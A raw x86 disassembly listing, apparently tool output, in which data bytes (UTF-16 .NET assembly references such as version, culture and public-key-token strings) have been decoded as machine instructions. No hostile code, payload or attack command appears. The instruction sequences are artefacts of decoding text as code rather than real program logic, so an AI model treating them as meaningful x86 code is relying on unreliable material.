  4063a1:	dec    ebx
  4063a2:	add    BYTE PTR [ebp+0x0],ah
  4063a5:	jns    0x4063a7
  4063a7:	push   esp
  4063a8:	add    BYTE PTR [edi+0x0],ch
  4063ab:	imul   eax,DWORD PTR [eax],0x65
  4063ae:	add    BYTE PTR [esi+0x0],ch
  4063b1:	cmp    eax,0x37006200
  4063b6:	add    BYTE PTR [edi],dh
  4063b8:	add    BYTE PTR [ecx+0x0],ah
  4063bb:	xor    eax,0x35006300
  4063c0:	add    BYTE PTR [esi],dh
  4063c2:	add    BYTE PTR [ecx],dh
  4063c4:	add    BYTE PTR [ecx],bh
  4063c6:	add    BYTE PTR [ebx],dh
  4063c8:	add    BYTE PTR [eax+eax*1],dh
  4063cb:	add    BYTE PTR gs:[eax],dh
  4063ce:	add    BYTE PTR [eax],bh
  4063d0:	add    BYTE PTR [ecx],bh
  4063d2:	add    BYTE PTR [eax+0x790053b4],al
  4063d8:	add    BYTE PTR [ebx+0x0],dh
  4063db:	je     0x4063dd
  4063dd:	add    BYTE PTR gs:[ebp+0x0],ch
  4063e1:	add    BYTE PTR cs:[edx+0x0],dl
  4063e5:	jne    0x4063e7
  4063e7:	outs   dx,BYTE PTR ds:[esi]
  4063e8:	add    BYTE PTR [eax+eax*1+0x69],dh
  4063ec:	add    BYTE PTR [ebp+0x0],ch
  4063ef:	add    BYTE PTR gs:[esi],ch
  4063f2:	add    BYTE PTR [edx+0x0],dl
  4063f5:	add    BYTE PTR gs:[ebp+0x0],ch
  4063f9:	outs   dx,DWORD PTR ds:[esi]
  4063fa:	add    BYTE PTR [eax+eax*1+0x69],dh
  4063fe:	add    BYTE PTR [esi+0x0],ch
  406401:	add    BYTE PTR [si],ch
  406404:	add    BYTE PTR [eax],ah
  406406:	add    BYTE PTR [esi+0x0],dl
  406409:	add    BYTE PTR gs:[edx+0x0],dh
  40640d:	jae    0x40640f
  40640f:	imul   eax,DWORD PTR [eax],0x6e006f
  406415:	cmp    eax,0x2e003400
  40641a:	add    BYTE PTR [eax],dh
  40641c:	add    BYTE PTR [esi],ch
  40641e:	add    BYTE PTR [eax],dh
  406420:	add    BYTE PTR [esi],ch
  406422:	add    BYTE PTR [eax],dh
  406424:	add    BYTE PTR [eax+eax*1],ch
  406427:	and    BYTE PTR [eax],al
  406429:	inc    ebx
  40642a:	add    BYTE PTR [ebp+0x0],dh
  40642d:	ins    BYTE PTR es:[edi],dx
  40642e:	add    BYTE PTR [eax+eax*1+0x75],dh
  406432:	add    BYTE PTR [edx+0x0],dh
  406435:	add    BYTE PTR gs:0x65006e00,bh
  40643c:	add    BYTE PTR [ebp+0x0],dh
  40643f:	je     0x406441
  406441:	jb     0x406443
  406443:	popa   
  406444:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406448:	add    BYTE PTR [eax],ah
  40644a:	add    BYTE PTR [eax+0x0],dl
  40644d:	jne    0x40644f
  40644f:	bound  eax,QWORD PTR [eax]
  406451:	ins    BYTE PTR es:[edi],dx
  406452:	add    BYTE PTR [ecx+0x0],ch
  406455:	arpl   WORD PTR [eax],ax
  406457:	dec    ebx
  406458:	add    BYTE PTR [ebp+0x0],ah
  40645b:	jns    0x40645d
  40645d:	push   esp
  40645e:	add    BYTE PTR [edi+0x0],ch
  406461:	imul   eax,DWORD PTR [eax],0x65
  406464:	add    BYTE PTR [esi+0x0],ch
  406467:	cmp    eax,0x37006200
  40646c:	add    BYTE PTR [edi],dh
  40646e:	add    BYTE PTR [ecx+0x0],ah
  406471:	xor    eax,0x35006300
  406476:	add    BYTE PTR [esi],dh
  406478:	add    BYTE PTR [ecx],dh
  40647a:	add    BYTE PTR [ecx],bh
  40647c:	add    BYTE PTR [ebx],dh
  40647e:	add    BYTE PTR [eax+eax*1],dh
  406481:	add    BYTE PTR gs:[eax],dh
  406484:	add    BYTE PTR [eax],bh
  406486:	add    BYTE PTR [ecx],bh
  406488:	add    BYTE PTR [eax+0x790053c4],al
  40648e:	add    BYTE PTR [ebx+0x0],dh
  406491:	je     0x406493
  406493:	add    BYTE PTR gs:[ebp+0x0],ch
  406497:	add    BYTE PTR cs:[eax+eax*1+0x68],dl
  40649c:	add    BYTE PTR [edx+0x0],dh
  40649f:	add    BYTE PTR gs:[ecx+0x0],ah
  4064a3:	add    BYTE PTR fs:[ecx+0x0],ch
  4064a7:	outs   dx,BYTE PTR ds:[esi]
  4064a8:	add    BYTE PTR [edi+0x0],ah
  4064ab:	add    BYTE PTR cs:[eax+eax*1+0x61],dl
  4064b0:	add    BYTE PTR [ebx+0x0],dh
  4064b3:	imul   eax,DWORD PTR [eax],0x73
  4064b6:	add    BYTE PTR [esi],ch
  4064b8:	add    BYTE PTR [eax+eax*1+0x61],al
  4064bc:	add    BYTE PTR [eax+eax*1+0x61],dh
  4064c0:	add    BYTE PTR [esi+0x0],ah
  4064c3:	ins    BYTE PTR es:[edi],dx
  4064c4:	add    BYTE PTR [edi+0x0],ch
  4064c7:	ja     0x4064c9
  4064c9:	sub    al,0x0
  4064cb:	and    BYTE PTR [eax],al
  4064cd:	push   esi
  4064ce:	add    BYTE PTR [ebp+0x0],ah
  4064d1:	jb     0x4064d3
  4064d3:	jae    0x4064d5
  4064d5:	imul   eax,DWORD PTR [eax],0x6e006f
  4064db:	cmp    eax,0x2e003400
  4064e0:	add    BYTE PTR [eax],dh
  4064e2:	add    BYTE PTR [esi],ch
  4064e4:	add    BYTE PTR [eax],dh
  4064e6:	add    BYTE PTR [esi],ch
  4064e8:	add    BYTE PTR [eax],dh
  4064ea:	add    BYTE PTR [eax+eax*1],ch
  4064ed:	and    BYTE PTR [eax],al
  4064ef:	inc    ebx
  4064f0:	add    BYTE PTR [ebp+0x0],dh
  4064f3:	ins    BYTE PTR es:[edi],dx
  4064f4:	add    BYTE PTR [eax+eax*1+0x75],dh
  4064f8:	add    BYTE PTR [edx+0x0],dh
  4064fb:	add    BYTE PTR gs:0x65006e00,bh
  406502:	add    BYTE PTR [ebp+0x0],dh
  406505:	je     0x406507
  406507:	jb     0x406509
  406509:	popa   
  40650a:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40650e:	add    BYTE PTR [eax],ah
  406510:	add    BYTE PTR [eax+0x0],dl
  406513:	jne    0x406515
  406515:	bound  eax,QWORD PTR [eax]
  406517:	ins    BYTE PTR es:[edi],dx
  406518:	add    BYTE PTR [ecx+0x0],ch
  40651b:	arpl   WORD PTR [eax],ax
  40651d:	dec    ebx
  40651e:	add    BYTE PTR [ebp+0x0],ah
  406521:	jns    0x406523
  406523:	push   esp
  406524:	add    BYTE PTR [edi+0x0],ch
  406527:	imul   eax,DWORD PTR [eax],0x65
  40652a:	add    BYTE PTR [esi+0x0],ch
  40652d:	cmp    eax,0x37006200
  406532:	add    BYTE PTR [edi],dh
  406534:	add    BYTE PTR [ecx+0x0],ah
  406537:	xor    eax,0x35006300
  40653c:	add    BYTE PTR [esi],dh
  40653e:	add    BYTE PTR [ecx],dh
  406540:	add    BYTE PTR [ecx],bh
  406542:	add    BYTE PTR [ebx],dh
  406544:	add    BYTE PTR [eax+eax*1],dh
  406547:	add    BYTE PTR gs:[eax],dh
  40654a:	add    BYTE PTR [eax],bh
  40654c:	add    BYTE PTR [ecx],bh
  40654e:	add    BYTE PTR [eax+0x790053ae],al
  406554:	add    BYTE PTR [ebx+0x0],dh
  406557:	je     0x406559
  406559:	add    BYTE PTR gs:[ebp+0x0],ch
  40655d:	add    BYTE PTR cs:[edi+0x0],dl
  406561:	imul   eax,DWORD PTR [eax],0x64006e
  406567:	outs   dx,DWORD PTR ds:[esi]
  406568:	add    BYTE PTR [edi+0x0],dh
  40656b:	jae    0x40656d
  40656d:	add    BYTE PTR cs:[esi+0x0],al
  406571:	outs   dx,DWORD PTR ds:[esi]
  406572:	add    BYTE PTR [edx+0x0],dh
  406575:	ins    DWORD PTR es:[edi],dx
  406576:	add    BYTE PTR [ebx+0x0],dh
  406579:	sub    al,0x0
  40657b:	and    BYTE PTR [eax],al
  40657d:	push   esi
  40657e:	add    BYTE PTR [ebp+0x0],ah
  406581:	jb     0x406583
  406583:	jae    0x406585
  406585:	imul   eax,DWORD PTR [eax],0x6e006f
  40658b:	cmp    eax,0x2e003400
  406590:	add    BYTE PTR [eax],dh
  406592:	add    BYTE PTR [esi],ch
  406594:	add    BYTE PTR [eax],dh
  406596:	add    BYTE PTR [esi],ch
  406598:	add    BYTE PTR [eax],dh
  40659a:	add    BYTE PTR [eax+eax*1],ch
  40659d:	and    BYTE PTR [eax],al
  40659f:	inc    ebx
  4065a0:	add    BYTE PTR [ebp+0x0],dh
  4065a3:	ins    BYTE PTR es:[edi],dx
  4065a4:	add    BYTE PTR [eax+eax*1+0x75],dh
  4065a8:	add    BYTE PTR [edx+0x0],dh
  4065ab:	add    BYTE PTR gs:0x65006e00,bh
  4065b2:	add    BYTE PTR [ebp+0x0],dh
  4065b5:	je     0x4065b7
  4065b7:	jb     0x4065b9
  4065b9:	popa   
  4065ba:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4065be:	add    BYTE PTR [eax],ah
  4065c0:	add    BYTE PTR [eax+0x0],dl
  4065c3:	jne    0x4065c5
  4065c5:	bound  eax,QWORD PTR [eax]
  4065c7:	ins    BYTE PTR es:[edi],dx
  4065c8:	add    BYTE PTR [ecx+0x0],ch
  4065cb:	arpl   WORD PTR [eax],ax
  4065cd:	dec    ebx
  4065ce:	add    BYTE PTR [ebp+0x0],ah
  4065d1:	jns    0x4065d3
  4065d3:	push   esp
  4065d4:	add    BYTE PTR [edi+0x0],ch
  4065d7:	imul   eax,DWORD PTR [eax],0x65
  4065da:	add    BYTE PTR [esi+0x0],ch
  4065dd:	cmp    eax,0x37006200
  4065e2:	add    BYTE PTR [edi],dh
  4065e4:	add    BYTE PTR [ecx+0x0],ah
  4065e7:	xor    eax,0x35006300
  4065ec:	add    BYTE PTR [esi],dh
  4065ee:	add    BYTE PTR [ecx],dh
  4065f0:	add    BYTE PTR [ecx],bh
  4065f2:	add    BYTE PTR [ebx],dh
  4065f4:	add    BYTE PTR [eax+eax*1],dh
  4065f7:	add    BYTE PTR gs:[eax],dh
  4065fa:	add    BYTE PTR [eax],bh
  4065fc:	add    BYTE PTR [ecx],bh
  4065fe:	add    BYTE PTR [eax+0x7900539a],al
  406604:	add    BYTE PTR [ebx+0x0],dh
  406607:	je     0x406609
  406609:	add    BYTE PTR gs:[ebp+0x0],ch
  40660d:	add    BYTE PTR cs:[eax+0x0],bl
  406611:	ins    DWORD PTR es:[edi],dx
  406612:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406616:	add    BYTE PTR [eax],ah
  406618:	add    BYTE PTR [esi+0x0],dl
  40661b:	add    BYTE PTR gs:[edx+0x0],dh
  40661f:	jae    0x406621
  406621:	imul   eax,DWORD PTR [eax],0x6e006f
  406627:	cmp    eax,0x2e003400
  40662c:	add    BYTE PTR [eax],dh
  40662e:	add    BYTE PTR [esi],ch
  406630:	add    BYTE PTR [eax],dh
  406632:	add    BYTE PTR [esi],ch
  406634:	add    BYTE PTR [eax],dh
  406636:	add    BYTE PTR [eax+eax*1],ch
  406639:	and    BYTE PTR [eax],al
  40663b:	inc    ebx
  40663c:	add    BYTE PTR [ebp+0x0],dh
  40663f:	ins    BYTE PTR es:[edi],dx
  406640:	add    BYTE PTR [eax+eax*1+0x75],dh
  406644:	add    BYTE PTR [edx+0x0],dh
  406647:	add    BYTE PTR gs:0x65006e00,bh
  40664e:	add    BYTE PTR [ebp+0x0],dh
  406651:	je     0x406653
  406653:	jb     0x406655
  406655:	popa   
  406656:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40665a:	add    BYTE PTR [eax],ah
  40665c:	add    BYTE PTR [eax+0x0],dl
  40665f:	jne    0x406661
  406661:	bound  eax,QWORD PTR [eax]
  406663:	ins    BYTE PTR es:[edi],dx
  406664:	add    BYTE PTR [ecx+0x0],ch
  406667:	arpl   WORD PTR [eax],ax
  406669:	dec    ebx
  40666a:	add    BYTE PTR [ebp+0x0],ah
  40666d:	jns    0x40666f
  40666f:	push   esp
  406670:	add    BYTE PTR [edi+0x0],ch
  406673:	imul   eax,DWORD PTR [eax],0x65
  406676:	add    BYTE PTR [esi+0x0],ch
  406679:	cmp    eax,0x37006200
  40667e:	add    BYTE PTR [edi],dh
  406680:	add    BYTE PTR [ecx+0x0],ah
  406683:	xor    eax,0x35006300
  406688:	add    BYTE PTR [esi],dh
  40668a:	add    BYTE PTR [ecx],dh
  40668c:	add    BYTE PTR [ecx],bh
  40668e:	add    BYTE PTR [ebx],dh
  406690:	add    BYTE PTR [eax+eax*1],dh
  406693:	add    BYTE PTR gs:[eax],dh
  406696:	add    BYTE PTR [eax],bh
  406698:	add    BYTE PTR [ecx],bh
  40669a:	add    BYTE PTR [eax],ah
  40669c:	bound  eax,QWORD PTR [eax]
  40669e:	xor    BYTE PTR [eax],al
  4066a0:	xor    eax,DWORD PTR [eax]
  4066a2:	data16 add BYTE PTR ds:0x37006600,dh
  4066a9:	add    BYTE PTR [esi+0x0],ah
  4066ac:	xor    DWORD PTR [eax],eax
  4066ae:	xor    DWORD PTR [eax],eax
  4066b0:	add    BYTE PTR fs:0x61003000,dh
  4066b7:	add    BYTE PTR [ebx],dh
  4066b9:	add    BYTE PTR [ecx+0x0],ah
  4066bc:	add    BYTE PTR [eax+0x300030],0x32
  4066c3:	add    BYTE PTR [eax+eax*1],dh
  4066c6:	xor    BYTE PTR [eax],al
  4066c8:	xor    BYTE PTR [eax],al
  4066ca:	xor    BYTE PTR [eax],al
  4066cc:	xor    BYTE PTR [eax],al
  4066ce:	xor    BYTE PTR [eax],al
  4066d0:	xor    al,0x0
  4066d2:	cmp    BYTE PTR [eax],al
  4066d4:	xor    BYTE PTR [eax],al
  4066d6:	xor    BYTE PTR [eax],al
  4066d8:	xor    BYTE PTR [eax],al
  4066da:	xor    BYTE PTR [eax],al
  4066dc:	xor    BYTE PTR [eax],al
  4066de:	cmp    DWORD PTR [eax],eax
  4066e0:	xor    al,0x0
  4066e2:	xor    BYTE PTR [eax],al
  4066e4:	xor    BYTE PTR [eax],al
  4066e6:	xor    BYTE PTR [eax],al
  4066e8:	xor    BYTE PTR [eax],al
  4066ea:	xor    BYTE PTR [eax],al
  4066ec:	xor    BYTE PTR [eax],al
  4066ee:	xor    BYTE PTR [eax],al
  4066f0:	add    BYTE PTR ss:[eax],dh
  4066f3:	add    BYTE PTR [edx],dh
  4066f5:	add    BYTE PTR [eax],dh
  4066f7:	add    BYTE PTR [eax],dh
  4066f9:	add    BYTE PTR [eax],dh
  4066fb:	add    BYTE PTR [eax],dh
  4066fd:	add    BYTE PTR [eax],dh
  4066ff:	add    BYTE PTR [eax],dh
  406701:	add    BYTE PTR [edx],dh
  406703:	add    BYTE PTR [eax+eax*1],dh
  406706:	xor    BYTE PTR [eax],al
  406708:	xor    BYTE PTR [eax],al
  40670a:	xor    BYTE PTR [eax],al
  40670c:	xor    BYTE PTR [eax],al
  40670e:	xor    eax,0x35003200
  406713:	add    BYTE PTR [ebx],dh
  406715:	add    BYTE PTR [eax+eax*1],dh
  406718:	xor    DWORD PTR [eax],eax
  40671a:	xor    eax,DWORD PTR [eax]
  40671c:	xor    DWORD PTR [eax],eax
  40671e:	xor    BYTE PTR [eax],al
  406720:	xor    BYTE PTR [eax],al
  406722:	xor    BYTE PTR [eax],al
  406724:	xor    al,0x0
  406726:	xor    BYTE PTR [eax],al
  406728:	xor    BYTE PTR [eax],al
  40672a:	xor    BYTE PTR [eax],al
  40672c:	xor    BYTE PTR [eax],al
  40672e:	xor    BYTE PTR [eax],al
  406730:	xor    DWORD PTR [eax],eax
  406732:	xor    BYTE PTR [eax],al
  406734:	xor    BYTE PTR [eax],al
  406736:	xor    BYTE PTR [eax],al
  406738:	xor    DWORD PTR [eax],eax
  40673a:	xor    BYTE PTR [eax],al
  40673c:	xor    BYTE PTR [eax],al
  40673e:	xor    BYTE PTR [eax],al
  406740:	aaa    
  406741:	add    BYTE PTR [eax+eax*1+0x31],al
  406745:	add    BYTE PTR [esi+0x0],al
  406748:	inc    ecx
  406749:	add    BYTE PTR ds:0x43003700,dh
  40674f:	add    BYTE PTR [eax+eax*1],dh
  406752:	inc    ecx
  406753:	add    BYTE PTR [ebp+0x0],al
  406756:	inc    esp
  406757:	add    BYTE PTR [ecx],bh
  406759:	add    BYTE PTR [esi+0x0],al
  40675c:	xor    BYTE PTR [eax],al
  40675e:	inc    ecx
  40675f:	add    BYTE PTR [ebx],dh
  406761:	add    BYTE PTR [edx],dh
  406763:	add    BYTE PTR [ebp+0x0],al
  406766:	cmp    BYTE PTR [eax],al
  406768:	xor    al,0x0
  40676a:	inc    ecx
  40676b:	add    BYTE PTR [ecx+0x0],al
  40676e:	xor    BYTE PTR [eax],al
  406770:	inc    esi
  406771:	add    BYTE PTR [ecx+0x0],al
  406774:	inc    ebp
  406775:	add    BYTE PTR [esi+0x0],al
  406778:	inc    esp
  406779:	add    BYTE PTR [eax],dh
  40677b:	add    BYTE PTR [eax+eax*1+0x45],al
  40677f:	add    BYTE PTR [ecx],bh
  406781:	add    BYTE PTR [ebp+0x0],al
  406784:	cmp    BYTE PTR [eax],al
  406786:	inc    esi
  406787:	add    BYTE PTR [eax+eax*1+0x36],al
  40678b:	add    BYTE PTR [ecx+0x0],al
  40678e:	inc    ebp
  40678f:	add    BYTE PTR [ebx+0x0],al
  406792:	cmp    BYTE PTR [eax],al
  406794:	inc    esi
  406795:	add    BYTE PTR [eax],bh
  406797:	add    BYTE PTR [edi],dh
  406799:	add    BYTE PTR [esi+0x0],al
  40679c:	inc    edx
  40679d:	add    BYTE PTR [eax],dh
  40679f:	add    BYTE PTR [ebx],dh
  4067a1:	add    BYTE PTR [edi],dh
  4067a3:	add    BYTE PTR [esi],dh
  4067a5:	add    BYTE PTR [esi],dh
  4067a7:	add    BYTE PTR [ebx+0x0],al
  4067aa:	cmp    BYTE PTR [eax],al
  4067ac:	xor    eax,DWORD PTR [eax]
  4067ae:	xor    al,0x0
  4067b0:	inc    ebx
  4067b1:	add    BYTE PTR [ecx],bh
  4067b3:	add    BYTE PTR [ecx],bh
  4067b5:	add    BYTE PTR [ecx],bh
  4067b7:	add    BYTE PTR [edx],dh
  4067b9:	add    BYTE PTR [ecx],dh
  4067bb:	add    BYTE PTR [ebp+0x0],al
  4067be:	inc    edx
  4067bf:	add    BYTE PTR [edx],dh
  4067c1:	add    BYTE PTR [ebx],dh
  4067c3:	add    BYTE PTR [edx+0x0],al
  4067c6:	inc    ebp
  4067c7:	add    BYTE PTR [edi],dh
  4067c9:	add    BYTE PTR [ecx],bh
  4067cb:	add    BYTE PTR [ecx+0x0],al
  4067ce:	inc    esp
  4067cf:	add    BYTE PTR [ecx],bh
  4067d1:	add    BYTE PTR [eax+eax*1+0x35],al
  4067d5:	add    BYTE PTR [eax+eax*1+0x43],al
  4067d9:	add    BYTE PTR [ebx+0x0],al
  4067dc:	xor    DWORD PTR [eax],eax
  4067de:	inc    esp
  4067df:	add    BYTE PTR [eax+eax*1+0x39],al
  4067e3:	add    BYTE PTR [ecx+0x0],al
  4067e6:	inc    esp
  4067e7:	add    BYTE PTR [edx],dh
  4067e9:	add    BYTE PTR [ebx],dh
  4067eb:	add    BYTE PTR [esi],dh
  4067ed:	add    BYTE PTR [ecx],dh
  4067ef:	add    BYTE PTR [ebx],dh
  4067f1:	add    BYTE PTR [edx],dh
  4067f3:	add    BYTE PTR [ecx],dh
  4067f5:	add    BYTE PTR [eax],dh
  4067f7:	add    BYTE PTR [edx],dh
  4067f9:	add    BYTE PTR [ecx],bh
  4067fb:	add    BYTE PTR [eax],dh
  4067fd:	add    BYTE PTR [eax],dh
  4067ff:	add    BYTE PTR [edx+0x0],al
  406802:	aaa    
  406803:	add    BYTE PTR [edx],dh
  406805:	add    BYTE PTR [ebx],dh
  406807:	add    BYTE PTR [ebx+0x0],al
  40680a:	inc    esi
  40680b:	add    BYTE PTR [ecx],bh
  40680d:	add    BYTE PTR [eax],bh
  40680f:	add    BYTE PTR [eax],dh
  406811:	add    BYTE PTR [ecx],bh
  406813:	add    BYTE PTR ds:0x46003700,dh
  406819:	add    BYTE PTR [ebx+0x0],al
  40681c:	xor    al,0x0
  40681e:	inc    ebp
  40681f:	add    BYTE PTR [ecx],dh
  406821:	add    BYTE PTR [edi],dh
  406823:	add    BYTE PTR [edi],dh
  406825:	add    BYTE PTR [ecx],dh
  406827:	add    BYTE PTR [eax],dh
  406829:	add    BYTE PTR [eax],bh
  40682b:	add    BYTE PTR [esi+0x0],al
  40682e:	inc    ebx
  40682f:	add    BYTE PTR [esi],dh
  406831:	add    BYTE PTR [eax],dh
  406833:	add    BYTE PTR [edi],dh
  406835:	add    BYTE PTR [edi],dh
  406837:	add    BYTE PTR [edi],dh
  406839:	add    BYTE PTR [eax+eax*1],dh
  40683c:	inc    esi
  40683d:	add    BYTE PTR [edx],dh
  40683f:	add    BYTE PTR [ecx],bh
  406841:	add    BYTE PTR [ebp+0x0],al
  406844:	cmp    BYTE PTR [eax],al
  406846:	xor    eax,DWORD PTR [eax]
  406848:	xor    al,BYTE PTR [eax]
  40684a:	xor    BYTE PTR [eax],al
  40684c:	inc    ebp
  40684d:	add    BYTE PTR [ecx],bh
  40684f:	add    BYTE PTR [edx],dh
  406851:	add    BYTE PTR [ebp+0x0],al
  406854:	inc    ecx
  406855:	add    BYTE PTR [eax],dh
  406857:	add    BYTE PTR ds:0x43004500,dh
  40685d:	add    BYTE PTR [ebp+0x0],al
  406860:	xor    al,0x0
  406862:	inc    ebp
  406863:	add    BYTE PTR [eax],bh
  406865:	add    BYTE PTR [edx],dh
  406867:	add    BYTE PTR [ecx],dh
  406869:	add    BYTE PTR [ebx+0x0],al
  40686c:	xor    BYTE PTR [eax],al
  40686e:	inc    ecx
  40686f:	add    BYTE PTR ds:0x46004500,dh
  406875:	add    BYTE PTR [ebp+0x0],al
  406878:	cmp    BYTE PTR [eax],al
  40687a:	inc    esi
  40687b:	add    BYTE PTR [ecx],dh
  40687d:	add    BYTE PTR [esi],dh
  40687f:	add    BYTE PTR [eax+eax*1],dh
  406882:	xor    eax,0x34004300
  406887:	add    BYTE PTR [ebx+0x0],al
  40688a:	xor    BYTE PTR [eax],al
  40688c:	inc    ebx
  40688d:	add    BYTE PTR [ecx],bh
  40688f:	add    BYTE PTR [ebx],dh
  406891:	add    BYTE PTR [ebx+0x0],al
  406894:	xor    DWORD PTR [eax],eax
  406896:	inc    ecx
  406897:	add    BYTE PTR [edx+0x0],al
  40689a:	cmp    DWORD PTR [eax],eax
  40689c:	cmp    DWORD PTR [eax],eax
  40689e:	xor    al,BYTE PTR [eax]
  4068a0:	cmp    BYTE PTR [eax],al
  4068a2:	xor    eax,0x36004400
  4068a7:	add    BYTE PTR [edx],dh
  4068a9:	add    BYTE PTR [edx],dh
  4068ab:	add    BYTE PTR [ebx+0x0],al
  4068ae:	inc    ecx
  4068af:	add    BYTE PTR [ecx+0x0],al
  4068b2:	add    BYTE PTR ss:0x43003200,dh
  4068b9:	add    BYTE PTR [ecx],dh
  4068bb:	add    BYTE PTR [eax+eax*1+0x46],al
  4068bf:	add    BYTE PTR [ecx+0x0],al
  4068c2:	inc    esp
  4068c3:	add    BYTE PTR [esi],dh
  4068c5:	add    BYTE PTR [ebx],dh
  4068c7:	add    BYTE PTR [eax+eax*1+0x37],al
  4068cb:	add    BYTE PTR [eax+eax*1],dh
  4068ce:	xor    eax,0x36004400
  4068d3:	add    BYTE PTR [esi+0x0],al
  4068d6:	xor    al,BYTE PTR [eax]
  4068d8:	inc    esp
  4068d9:	add    BYTE PTR [ebp+0x0],al
  4068dc:	xor    eax,0x31004600
  4068e1:	add    BYTE PTR [edi],dh
  4068e3:	add    BYTE PTR [ebp+0x0],al
  4068e6:	xor    eax,0x41004500
  4068eb:	add    BYTE PTR [esi+0x0],al
  4068ee:	xor    BYTE PTR [eax],al
  4068f0:	inc    esi
  4068f1:	add    BYTE PTR [ebx+0x0],al
  4068f4:	xor    al,0x0
  4068f6:	cmp    DWORD PTR [eax],eax
  4068f8:	add    BYTE PTR ss:[ebx],dh
  4068fb:	add    BYTE PTR [eax+eax*1+0x32],al
  4068ff:	add    BYTE PTR [esi],dh
  406901:	add    BYTE PTR [ecx],dh
  406903:	add    BYTE PTR [ebx+0x0],al
  406906:	cmp    BYTE PTR [eax],al
  406908:	inc    ecx
  406909:	add    BYTE PTR [ecx],dh
  40690b:	add    BYTE PTR [edx],dh
  40690d:	add    BYTE PTR [eax+eax*1],dh
  406910:	xor    eax,DWORD PTR [eax]
  406912:	add    BYTE PTR ss:0x38003100,dh
  406919:	add    BYTE PTR [edx],dh
  40691b:	add    BYTE PTR [eax],dh
  40691d:	add    BYTE PTR [esi],dh
  40691f:	add    BYTE PTR [eax+eax*1+0x43],al
  406923:	add    BYTE PTR [eax],dh
  406925:	add    BYTE PTR [ecx],bh
  406927:	add    BYTE PTR [ebx],dh
  406929:	add    BYTE PTR [ebx],dh
  40692b:	add    BYTE PTR [eax+eax*1],dh
  40692e:	xor    al,0x0
  406930:	inc    esp
  406931:	add    BYTE PTR ds:0x44004100,dh
  406937:	add    BYTE PTR [edx],dh
  406939:	add    BYTE PTR [ecx],bh
  40693b:	add    BYTE PTR [ebx],dh
  40693d:	add    BYTE PTR [eax+0x790053d0],al
  406943:	add    BYTE PTR [ebx+0x0],dh
  406946:	je     0x406948
  406948:	add    BYTE PTR gs:[ebp+0x0],ch
  40694c:	add    BYTE PTR cs:[ebx+0x0],al
  406950:	outs   dx,DWORD PTR ds:[esi]
  406951:	add    BYTE PTR [ebp+0x0],ch
  406954:	jo     0x406956
  406956:	outs   dx,DWORD PTR ds:[esi]
  406957:	add    BYTE PTR [esi+0x0],ch
  40695a:	add    BYTE PTR gs:[esi+0x0],ch
  40695e:	je     0x406960
  406960:	dec    ebp
  406961:	add    BYTE PTR [edi+0x0],ch
  406964:	add    BYTE PTR fs:[ebp+0x0],ah
  406968:	ins    BYTE PTR es:[edi],dx
  406969:	add    BYTE PTR [esi],ch
  40696b:	add    BYTE PTR [eax+eax*1+0x61],al
  40696f:	add    BYTE PTR [eax+eax*1+0x61],dh
  406973:	add    BYTE PTR [ecx+0x0],al
  406976:	outs   dx,BYTE PTR ds:[esi]
  406977:	add    BYTE PTR [esi+0x0],ch
  40697a:	outs   dx,DWORD PTR ds:[esi]
  40697b:	add    BYTE PTR [eax+eax*1+0x61],dh
  40697f:	add    BYTE PTR [eax+eax*1+0x69],dh
  406983:	add    BYTE PTR [edi+0x0],ch
  406986:	outs   dx,BYTE PTR ds:[esi]
  406987:	add    BYTE PTR [ebx+0x0],dh
  40698a:	sub    al,0x0
  40698c:	and    BYTE PTR [eax],al
  40698e:	push   esi
  40698f:	add    BYTE PTR [ebp+0x0],ah
  406992:	jb     0x406994
  406994:	jae    0x406996
  406996:	imul   eax,DWORD PTR [eax],0x6e006f
  40699c:	cmp    eax,0x2e003400
  4069a1:	add    BYTE PTR [eax],dh
  4069a3:	add    BYTE PTR [esi],ch
  4069a5:	add    BYTE PTR [eax],dh
  4069a7:	add    BYTE PTR [esi],ch
  4069a9:	add    BYTE PTR [eax],dh
  4069ab:	add    BYTE PTR [eax+eax*1],ch
  4069ae:	and    BYTE PTR [eax],al
  4069b0:	inc    ebx
  4069b1:	add    BYTE PTR [ebp+0x0],dh
  4069b4:	ins    BYTE PTR es:[edi],dx
  4069b5:	add    BYTE PTR [eax+eax*1+0x75],dh
  4069b9:	add    BYTE PTR [edx+0x0],dh
  4069bc:	add    BYTE PTR gs:0x65006e00,bh
  4069c3:	add    BYTE PTR [ebp+0x0],dh
  4069c6:	je     0x4069c8
  4069c8:	jb     0x4069ca
  4069ca:	popa   
  4069cb:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4069cf:	add    BYTE PTR [eax],ah
  4069d1:	add    BYTE PTR [eax+0x0],dl
  4069d4:	jne    0x4069d6
  4069d6:	bound  eax,QWORD PTR [eax]
  4069d8:	ins    BYTE PTR es:[edi],dx
  4069d9:	add    BYTE PTR [ecx+0x0],ch
  4069dc:	arpl   WORD PTR [eax],ax
  4069de:	dec    ebx
  4069df:	add    BYTE PTR [ebp+0x0],ah
  4069e2:	jns    0x4069e4
  4069e4:	push   esp
  4069e5:	add    BYTE PTR [edi+0x0],ch
  4069e8:	imul   eax,DWORD PTR [eax],0x65
  4069eb:	add    BYTE PTR [esi+0x0],ch
  4069ee:	cmp    eax,0x31003300
  4069f3:	add    BYTE PTR [edx+0x0],ah
  4069f6:	data16 add BYTE PTR [ebx],dh
  4069f9:	add    BYTE PTR [eax],bh
  4069fb:	add    BYTE PTR ds:0x61003600,dh
  406a01:	add    BYTE PTR [eax+eax*1+0x33],ah
  406a05:	add    BYTE PTR [esi],dh
  406a07:	add    BYTE PTR [eax+eax*1],dh
  406a0a:	add    BYTE PTR gs:[ebx],dh
  406a0d:	add    BYTE PTR ds:0x53ae8000,dh
  406a13:	add    BYTE PTR [ecx+0x0],bh
  406a16:	jae    0x406a18
  406a18:	je     0x406a1a
  406a1a:	add    BYTE PTR gs:[ebp+0x0],ch
  406a1e:	add    BYTE PTR cs:[ebx+0x0],al
  406a22:	outs   dx,DWORD PTR ds:[esi]
  406a23:	add    BYTE PTR [esi+0x0],ch
  406a26:	data16 add BYTE PTR [ecx+0x0],ch
  406a2a:	add    BYTE PTR [di+0x0],dh
  406a2e:	jb     0x406a30
  406a30:	popa   
  406a31:	add    BYTE PTR [eax+eax*1+0x69],dh
  406a35:	add    BYTE PTR [edi+0x0],ch
  406a38:	outs   dx,BYTE PTR ds:[esi]
  406a39:	add    BYTE PTR [eax+eax*1],ch
